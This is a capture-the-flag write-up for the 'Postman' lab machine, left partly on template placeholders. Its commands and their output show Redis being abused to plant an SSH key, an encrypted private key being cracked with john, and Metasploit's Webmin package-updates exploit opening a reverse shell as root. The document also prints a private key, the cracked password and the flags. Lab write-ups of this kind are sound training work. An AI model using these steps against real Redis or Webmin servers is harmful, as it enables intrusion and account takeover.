
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV postman.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 17:00 (0:00:00 remaining)
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.56 seconds

```

```
 nmap -p- postman.htb --open           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.036s latency).
Not shown: 65468 closed tcp ports (reset), 63 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds

```

```
nmap -sC -sV postman.htb --open -p 6379
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:37 EDT
Nmap scan report for postman.htb (10.129.138.65)
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds

```

### Redis Enumeration

```
redis-cli -h 10.129.140.170
10.129.140.170:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.129.140.170:6379> config set dir ./.ssh
OK
10.129.140.170:6379> config get dir
3) "dir"
4) "/var/lib/redis/.ssh"

```

### Redis Exploitation

```
ssh-keygen -t ed25519 -f redis_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:OWerVFPcQXj/oAl1QxcPglrYH4jUIOeWDNv0QBQfGq4 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|      o+@B.o.+=.o|
|       @oB*o+o++.|
|      . Ooooo+.o.|
|       o..... . .|
|      E S =. o ..|
|         = oo   .|
|        . .      |
|       . .       |
|        .        |
+----[SHA256]-----+

```

```
┌──(kali㉿kali)-[~/machines/postman]
└─$ cat redis_key; echo -e "\n\n"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQAAAJCiP5Unoj+V
JwAAAAtzc2gtZWQyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQ
AAAEDhaeZXSPE+YamMDx2Ex0CvsHA7nCBllMa64VQqQ1FhgPzBy+Exryss9SSAjWwJq8lf
haVYDG953RXOuoBusM99AAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----



                                                                                                                    
┌──(kali㉿kali)-[~/machines/postman]
└─$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
                                                                                                                    
┌──(kali㉿kali)-[~/machines/postman]
└─$ cat spaced_key.txt | redis-cli -h 10.129.140.170 -x set ssh_key
OK

```

```
 redis-cli -h 10.129.140.170
10.129.140.170:6379> config set dir /var/lib/redis/.ssh
OK
10.129.140.170:6379> config set dbfilename "authorized_keys"
OK
10.129.140.170:6379> save
OK
10.129.140.170:6379> 

```

## Access as redis

```
ssh -i redis_key redis@10.129.140.170
The authenticity of host '10.129.140.170 (10.129.140.170)' can't be established.
ED25519 key fingerprint is: SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:57: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.140.170' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ 

```

---
## Lateral movement from redis to matt

```
redis@Postman:/var/lib$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ 

```

file is copied locally and converted into hash format with ssh2john:

```
 ssh2john id_rsa.key > id_rsa.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.key)     
1g 0:00:00:00 DONE (2026-09-21 05:04) 3.703g/s 914133p/s 914133c/s 914133C/s comunista..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

passphrase:`computer2008`

```
ssh -i id_rsa.key Matt@postman.htb 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa.key': 
Connection closed by 10.129.140.170 port 22

```

Checking the sshd config reveals that access is denied:

```
redis@Postman:/etc/ssh$ cat sshd_config
#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

#deny users
DenyUsers Matt

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
redis@Postman:/etc/ssh$ 

```


---
## User Flag

```
redis@Postman:/etc/ssh$ su Matt
Password: #computer2008
Matt@Postman:/etc/ssh$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/etc/ssh$ cat /home/Matt/user.txt
3b6fb792240d6e259fa70c36b2bca2da
Matt@Postman:/etc/ssh$ 

```

---
## Privilege Escalation

### Enumeration

```
Matt@Postman:~$ ps aux | grep root
root          1  0.0  0.9 159408  8752 ?        Ss   09:23   0:01 /sbin/init splash
root          2  0.0  0.0      0     0 ?        S    09:23   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        I    09:23   0:00 [kworker/0:0]
root          4  0.0  0.0      0     0 ?        I<   09:23   0:00 [kworker/0:0H]
root          5  0.0  0.0      0     0 ?        I    09:23   0:00 [kworker/u256:0]
root          6  0.0  0.0      0     0 ?        I<   09:23   0:00 [mm_percpu_wq]
root          7  0.0  0.0      0     0 ?        S    09:23   0:00 [ksoftirqd/0]
root          8  0.0  0.0      0     0 ?        I    09:23   0:00 [rcu_sched]
root          9  0.0  0.0      0     0 ?        I    09:23   0:00 [rcu_bh]
root         10  0.0  0.0      0     0 ?        S    09:23   0:00 [migration/0]
root         11  0.0  0.0      0     0 ?        S    09:23   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S    09:23   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S    09:23   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        I<   09:23   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S    09:23   0:00 [rcu_tasks_kthre]
root         16  0.0  0.0      0     0 ?        S    09:23   0:00 [kauditd]
root         17  0.0  0.0      0     0 ?        S    09:23   0:00 [khungtaskd]
root         18  0.0  0.0      0     0 ?        S    09:23   0:00 [oom_reaper]
root         19  0.0  0.0      0     0 ?        I<   09:23   0:00 [writeback]
root         20  0.0  0.0      0     0 ?        S    09:23   0:00 [kcompactd0]
root         21  0.0  0.0      0     0 ?        SN   09:23   0:00 [ksmd]
root         22  0.0  0.0      0     0 ?        SN   09:23   0:00 [khugepaged]
root         23  0.0  0.0      0     0 ?        I<   09:23   0:00 [crypto]
root         24  0.0  0.0      0     0 ?        I<   09:23   0:00 [kintegrityd]
root         25  0.0  0.0      0     0 ?        I<   09:23   0:00 [kblockd]
root         26  0.0  0.0      0     0 ?        I<   09:23   0:00 [ata_sff]
root         27  0.0  0.0      0     0 ?        I<   09:23   0:00 [md]
root         28  0.0  0.0      0     0 ?        I<   09:23   0:00 [edac-poller]
root         29  0.0  0.0      0     0 ?        I<   09:23   0:00 [devfreq_wq]
root         30  0.0  0.0      0     0 ?        I<   09:23   0:00 [watchdogd]
root         34  0.0  0.0      0     0 ?        S    09:23   0:00 [kswapd0]
root         35  0.0  0.0      0     0 ?        I<   09:23   0:00 [kworker/u257:0]
root         36  0.0  0.0      0     0 ?        S    09:23   0:00 [ecryptfs-kthrea]
root         78  0.0  0.0      0     0 ?        I<   09:23   0:00 [kthrotld]
root         79  0.0  0.0      0     0 ?        I<   09:23   0:00 [acpi_thermal_pm]
root         80  0.0  0.0      0     0 ?        S    09:23   0:00 [scsi_eh_0]
root         81  0.0  0.0      0     0 ?        I<   09:23   0:00 [scsi_tmf_0]
root         82  0.0  0.0      0     0 ?        S    09:23   0:00 [scsi_eh_1]
root         83  0.0  0.0      0     0 ?        I<   09:23   0:00 [scsi_tmf_1]
root         89  0.0  0.0      0     0 ?        I<   09:23   0:00 [ipv6_addrconf]
root         90  0.0  0.0      0     0 ?        I    09:23   0:01 [kworker/0:2]
root         99  0.0  0.0      0     0 ?        I<   09:23   0:00 [kstrp]
root        116  0.0  0.0      0     0 ?        I<   09:23   0:00 [charger_manager]
root        177  0.0  0.0      0     0 ?        I<   09:23   0:00 [mpt_poll_0]
root        178  0.0  0.0      0     0 ?        I<   09:23   0:00 [mpt/0]
root        179  0.0  0.0      0     0 ?        S    09:23   0:00 [scsi_eh_2]
root        180  0.0  0.0      0     0 ?        I<   09:23   0:00 [scsi_tmf_2]
root        182  0.0  0.0      0     0 ?        I<   09:23   0:00 [kworker/0:1H]
root        202  0.0  0.0      0     0 ?        S    09:23   0:00 [jbd2/sda1-8]
root        203  0.0  0.0      0     0 ?        I<   09:23   0:00 [ext4-rsv-conver]
root        243  0.0  1.5  94860 14192 ?        S<s  09:23   0:00 /lib/systemd/systemd-journald
root        258  0.0  0.5  45996  4896 ?        Ss   09:23   0:00 /lib/systemd/systemd-udevd
root        336  0.0  1.0  91152  9860 ?        Ss   09:23   0:00 /usr/bin/VGAuthService
root        337  0.0  0.8 153316  7596 ?        S<sl 09:23   0:02 /usr/bin/vmtoolsd
root        350  0.0  0.3  31320  3248 ?        Ss   09:23   0:00 /usr/sbin/cron -f
root        351  0.0  1.8 170344 17196 ?        Ssl  09:23   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        353  0.0  0.6  70604  5920 ?        Ss   09:23   0:00 /lib/systemd/systemd-logind
root        359  0.0  0.7 289844  7168 ?        Ssl  09:23   0:00 /usr/lib/accountsservice/accounts-daemon
root        447  0.0  0.0      0     0 ?        I<   09:23   0:00 [ttm_swap]
root        448  0.0  0.0      0     0 ?        S    09:23   0:00 [irq/16-vmwgfx]
root        568  0.0  0.3  25992  3384 ?        Ss   09:23   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root        657  0.0  0.2  16180  1976 tty1     Ss+  09:23   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        678  0.0  0.6  72296  6424 ?        Ss   09:23   0:00 /usr/sbin/sshd -D
root        705  0.0  1.8 331332 16616 ?        Ss   09:23   0:00 /usr/sbin/apache2 -k start
root        786  0.0  3.1  95304 29324 ?        Ss   09:23   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root        992  0.0  0.7 107984  6932 ?        Ss   09:54   0:00 sshd: redis [priv]
root       1139  0.0  0.0      0     0 ?        I    10:09   0:00 [kworker/u256:2]
root       1172  0.0  0.0      0     0 ?        I    10:18   0:00 [kworker/u256:1]
root       1177  0.0  0.4  63048  3952 pts/0    S    10:19   0:00 su Matt
root       1203  0.0  3.4  97604 31672 ?        S    10:21   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root       1204  0.0  3.4  97604 31672 ?        S    10:21   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
Matt       1208  0.0  0.1  14428  1060 pts/0    S+   10:22   0:00 grep --color=auto root

```

### Exploitation


```shell
msfconsole -q
msf > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf > use 7
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_packageup_rce) > options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910



View the full module info with the info, or info -d command.

msf exploit(linux/http/webmin_packageup_rce) > set lhost tun0
lhost => 10.10.15.80
msf exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf exploit(linux/http/webmin_packageup_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf exploit(linux/http/webmin_packageup_rce) > run
[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
msf exploit(linux/http/webmin_packageup_rce) > set rhosts 10.129.140.170
rhosts => 10.129.140.170
msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.15.80:4444 
[+] Session cookie: e0b4aac07f5aba7a769a5923fa7702e8
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.80:4444 -> 10.129.140.170:51060) at 2026-09-21 05:26:50 -0400

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
bf1b096f487286942993d6f0d7a844e2


```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)